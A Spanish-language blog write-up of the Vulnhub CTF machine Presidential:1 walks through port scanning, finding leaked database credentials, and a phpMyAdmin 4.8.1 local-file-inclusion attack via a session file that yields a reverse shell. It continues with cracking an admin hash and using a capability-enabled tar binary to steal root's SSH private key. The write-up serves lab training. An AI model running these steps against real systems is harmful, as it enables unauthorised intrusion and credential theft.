---
layout: post
title: "PRESIDENTIAL:1 | WriteUp"
date: 2025-05-21 23:11:00 +0200
categories: [WriteUp, Vulnhub]
tags: [Vulnhub, LFI, WriteUP, CTF, RedTeam]
---

## Fuente

- URL para descargar la máquina: [https://www.vulnhub.com/entry/presidential-1,500/](https://www.vulnhub.com/entry/presidential-1,500/)

---

## Fase de reconocimiento

Para empezar, voy a configurar la máquina en VMWare, y posteriormente, confirmo que aparezca en mi red local;

```bash
sudo arp-scan -I en0 --localnet --ignoredups
```

Confirmando que la máquina ya se encuentra en mi red local, realizo un escaneo **TCP** completo y rápido de todos los puertos abiertos en el host [`192.168.1.99`] sin resolución **DNS** ni detección de host, con salida en formato grepable;

```bash
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 192.168.1.99 -oG allPorts
``` 

De primeras, observo los siguientes puertos abiertos, (`80`) y (`2082`);

```
# Nmap 7.95 scan initiated Mon Apr 21 13:18:55 2025 as: nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn -oG allPorts 192.168.1.99
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 192.168.1.99 ()   Status: Up
Host: 192.168.1.99 ()   Ports: 80/open/tcp//http///, 2082/open/tcp//infowave/// Ignored State: filtered (65533)
# Nmap done at Mon Apr 21 14:02:49 2025 -- 1 IP address (1 host up) scanned in 2633.68 seconds
```

Voy a pasar de nuevo un escaneo detallado con *nmap* del puerto; (`80`) y (`2082`) en el host; [`192.168.1.99`], sin detección de host, utilizando scripts y detección de versiones;

```bash
nmap -p80,2082 -Pn -sCV 192.168.1.99 -oN targeted
```

Parece que por el puerto; (`80`) está montado un servidor **Apache 2.4.6** y **PHP 5.5.38**, y por el puerto; (`2082`) está corriendo un servicio **OpenSSH 7.4**;

```
Nmap scan report for votenow.home (192.168.1.99)
Host is up (0.0086s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.5.38)
|_http-title: Ontario Election Services &raquo; Vote Now!
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.5.38
| http-methods: 
|_  Potentially risky methods: TRACE
2082/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 06:40:f4:e5:8c:ad:1a:e6:86:de:a5:75:d0:a2:ac:80 (RSA)
|   256 e9:e6:3a:83:8e:94:f2:98:dd:3e:70:fb:b9:a3:e3:99 (ECDSA)
|_  256 66:a8:a1:9f:db:d5:ec:4c:0a:9c:4d:53:15:6c:43:6c (ED25519)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr 21 15:17:47 2025 -- 1 IP address (1 host up) scanned in 6.79 seconds
```

Me dirigo a la **IP** de la máquina víctima desde el navegador para visualizar el contenido de la web y para analizar el contenido de la misma. Aparentemente, no veo ningún subdirectorio directo al que poder dirigirme. En la parte inferior de la web, observo que aparece un posible dominio de la máquina en una dirección de correo electrónico, llamado `votenow.local`;

![presidential1_1](/assets/img/presidential1/PRESIDENTIAL 1-1745255387149.png){: w="1239" h="258" }

Agrego el dominio encontrado a mi archivo; (`/etc/hosts`) para que se asocie a la **IP** de la máquina víctima;

![presidential1_2](/assets/img/presidential1/PRESIDENTIAL 1-1745255282880.png){: w="953" h="199" }

---

## Enumeración de servicios

Como ya tengo un dominio, voy a probar con `fuff` para buscar posibles directorios del *host* con las extensiones indicadas;

```bash
ffuf -w /Users/n41rr47/Dictionaries/dirb/wordlists/common.txt -u http://votenow.local/FUZZ -e .php,.php.bak,.html,.txt,.bak,.old -mc 200
```

![presidential1_3](/assets/img/presidential1/PRESIDENTIAL 1-1745256987773.png){: w="1126" h="398" }

Voy a intentar visualizar desde el navegador el archivo; (`config.php.bak`) que apareció en el escaneo. Al entrar desde el navegador, la página parece vacía, pero en el código de la página si aparecen unas credenciales de acceso;

![presidential1_4](/assets/img/presidential1/PRESIDENTIAL 1-1745257021515.png){: w="1239" h="179" }

```
<?php

$dbUser = "votebox";
$dbPass = "casoj3FFASPsbyoRP";
$dbHost = "localhost";
$dbname = "votebox";

?>
```

Con las credenciales obtenidas, tengo que encontrar el directorio correcto para encontrar el panel de *Login* para introducirlas, por lo que realizo un escaneo de nuevo con `gobuster` para encontrar posibles subdominios virtuales (vhosts) del dominio `votenow.local`, ignorando los códigos de repuesta con valor (`400`);

```bash
gobuster vhost -u http://votenow.local -w /Users/n41rr47/Dictionaries/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --append-domain | grep -v "400"
```

![presidential1_5](/assets/img/presidential1/PRESIDENTIAL 1-1745342504808.png){: w="1048" h="250" }

Y parece que tengo un subdominio potencial; (`datasafe.votenow.local`). He probado a introducirla directamente en el navegador, pero no lograba cargar la web, por lo que he incluido el subdominio en el archivo; (`/etc/hosts`) para verificar si ahora cargaba correctamente:

![presidential1_6](/assets/img/presidential1/PRESIDENTIAL 1-1745397491043.png){: w="1048" h="234" }

Ahora al probar de nuevo, verifico que ya me carga un panel `phpMyAdmin` y consigo acceder con las credenciales obtenidas;

![presidential1_7](/assets/img/presidential1/PRESIDENTIAL 1-1745398724537.png){: w="1048" h="362" }

Encontré otras credenciales potenciales de administrador dentro de la tabla `users`;

![presidential1_8](/assets/img/presidential1/PRESIDENTIAL 1-1745400181528.png){: w="1048" h="346" }

```
admin:$2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i
```

Parece que la contraseña esta *hasheada*, por lo que voy a utilizar `john` para tratar de sacar la contraseña;

![presidential1_9](/assets/img/presidential1/PRESIDENTIAL 1-1745423440712.png){: w="1048" h="131" }

```
admin:Stella
```

Teniendo ya la contraseña, me centro en la manera de ganar acceso a la máquina. Revisando el panel de `phpMyAdmin`, encontré la versión que se está empleando actualmente;

![presidential1_10](/assets/img/presidential1/PRESIDENTIAL 1-1745439883864.png){: w="395" h="197" }

Por lo que he recurrido a `searchsploit` para encontrar alguna vulnerabilidad potencial para esa versión (`4.8.1`):

![presidential1_11](/assets/img/presidential1/PRESIDENTIAL 1-1745440944802.png){: w="1435" h="165" }

En mi caso, he utilizado la `(2)`, que explota un **LFI** a través de la *URL*. Probé a leer el archivo; (`/etc/passwd`) y me lo mostró correctamente;

![presidential1_12](/assets/img/presidential1/PRESIDENTIAL 1-1745441611162.png){: w="1435" h="258" }

Para poder obtener la *reverse shell*, voy a utilizar el siguiente comando en **PHP** desde la consola del `phpMyAdmin`;

![presidential1_13](/assets/img/presidential1/PRESIDENTIAL 1-1745836460009.png){: w="1435" h="807" }

Como aparece en el *screenshot* señalado, me tengo que copiar la *cookie* de sesión actual, ya que una vez cargada la instrucción en el sistema, tengo que incluirla al final de la línea de la **URL** para obtener la *reverse shell**. En el navegador escribí lo siguiente;

```
http://datasafe.votenow.local/server_sql.php/../../../../../../../../var/lib/php/sessions/sess_7pqcddrc9v73086tmpo3ed4vu5o7gq1d
```

Y antes de darle a intro, me puse en escucha desde mi equipo de atacante;

```bash
nc -nlvp 443
```

Una vez preparado, ya introducí la *URL* anterior desde el navegador, y en mi consola obtuve la *shell* con el usuario `apache`;

![presidential1_14](/assets/img/presidential1/PRESIDENTIAL 1-1745836102088.png){: w="1419" h="158" }

Voy a probar autenticándome como el usuario; (`admin`) con la contraseña que rompí antes en el *hash*; (`Stella`), y así empezar con la escalada de privilegios;

![presidential1_15](/assets/img/presidential1/image 1.png){: w="1435" h="114" }

---

## Escalada de privilegios

Voy a buscar de forma recursiva en el sistema posibles archivos con capacidades especiales asignadas;

```bash
getcap -r / 2>/dev/null
```

![presidential1_16](/assets/img/presidential1/PRESIDENTIAL 1-1746032684726.png){: w="1435" h="140" }

De los que aparecen, me llama la atención el binario; (`tarS`), ya que parece una versión de la herramienta de descompresión `tar`... También realizo la búsqueda de *binarios* con permisos de escritura, y me aparece de nuevo;

```bash
find / -writable 2>/dev/null | grep "/bin"
```

![presidential1_17](/assets/img/presidential1/image-2 1.png){: w="1435" h="53" }

Pruebo a utilizar el *binario* para intentar comprimir en mi directorio actual las claves privadas del usuario; (`root`) en un archivo al que llamo; (`id_rsa.tar`), y aparentemente, no me da ningún error:

![presidential1_18](/assets/img/presidential1/PRESIDENTIAL 1-1746025229593.png){: w="1435" h="92" }

Si ahora lo descomprimo y le hago un `cat`, confirmo que tengo las claves privadas de `root` para el servicio **SSH**, el cual se encontraba activo por el puerto (`2082`);

![presidential1_19](/assets/img/presidential1/PRESIDENTIAL 1-1746025523706.png){: w="1435" h="652" }

Me voy a copiar la clave entera en mi equipo de forma local y la voy a pegar en un archivo al que llamaré; (`id_rsa`). Una vez guardad, uintento conectarme al *host* por el puerto (`2082`), y ya estoy como el usuario `root` y encuentro la *flag* final;

```bash
ssh -i id_rsa root@192.168.1.99 -p 2082
```

![presidential1_20](/assets/img/presidential1/PRESIDENTIAL 1-1746025783794.png){: w="1435" h="283" }

```
Congratulations on getting root.

 _._     _,-'""`-._
(,-.`._,'(       |\`-/|
    `-.-' \ )-`( , o o)
          `-    \`_`"'-

This CTF was created by bootlesshacker - https://security.caerdydd.wales
```

---

## Recursos 

- [Linux Privilege Escalation using Capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
- [https://hack4u.io](https://hack4u.io/)
